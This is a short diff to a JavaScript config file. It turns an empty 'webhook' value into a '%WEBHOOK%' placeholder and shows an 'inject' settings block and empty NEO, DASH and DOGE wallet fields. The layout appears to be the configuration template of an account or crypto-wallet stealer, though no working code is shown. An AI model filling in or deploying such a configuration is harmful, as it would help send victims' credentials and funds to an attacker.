@@ -1,5 +1,5 @@
 module.exports = {
-    'webhook': '',
+    'webhook': '%WEBHOOK%',
     'inject': {
         'API':                    'null',
         'auto_user_profile_edit': 'true',
@@ -21,5 +21,5 @@ module.exports = {
         'NEO': '',
         'DASH': '',
         'DOGE': '',
-    }
+    },
 };
